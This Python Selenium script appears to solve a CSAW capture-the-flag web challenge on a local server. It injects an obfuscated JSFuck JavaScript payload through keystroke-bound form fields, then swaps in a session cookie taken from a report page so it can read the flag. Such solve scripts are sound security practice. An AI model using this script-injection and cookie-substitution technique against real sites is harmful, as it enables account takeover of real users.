from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver import ActionChains

from time import sleep
import re

if __name__ == '__main__':
    ingredients = {
        'p1Name' : 'rachet',
        'p1Down' : '[',
        'p1Up' : ']',
        'p1Left' : '(',
        'p1Right' : ')',
        'p1RstPos' : '!',
        'p1RstSpd' : '+',
        'p2Name' : 'clank',
        'p2Down' : 'h',
        'p2Up' : 'a',
        'p2Left' : 'c',
        'p2Right' : 'k',
        'p2RstPos' : 'e',
        'p2RstSpd' : 'd'
    }
        
    whereBrowser = 'http://127.0.0.1:8000'
    
    payload = '(![]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(+[![]]+[+(+!+[]+(!+[]+[])[!+[]+!+[]+!+[]]+[+!+[]]+[+[]]+[+[]]+[+[]])])[+!+[]+[+[]]]+(!![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+((+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]' #safetytime in jsf
    browser = webdriver.Firefox()
    browser.get(whereBrowser)
    
    for id, value in ingredients.items():
        try:
            browser.find_element(By.ID, id).send_keys(value)
        except Exception as e:
            print('ERR', str(e), 'at', id)
        
    
    try:
        browser.find_element(By.ID, 'submitButton').click()
    except Exception:
        print('ERR', 'submission failed')
    
    try:
        for key in payload:
            ActionChains(browser).send_keys(key).perform()
            sleep(0.1)
    except Exception:
        print('ERR', 'payload delpoyment failed')
    
    browser.get(whereBrowser + '/report')
    
    browser.find_element(By.ID, 'playerName').send_keys(ingredients['p1Name'])
    browser.find_element(By.ID, 'submitButton').click()
    safe = browser.find_element(By.ID, "dirt").text
        
    browser.add_cookie({'name': 'session', 'value': safe})
        
    browser.get(whereBrowser)
    
    pattern = re.compile(r'csawctf\{.*?\}')
    for match in pattern.findall(browser.page_source):
        print(match)
        
    browser.close()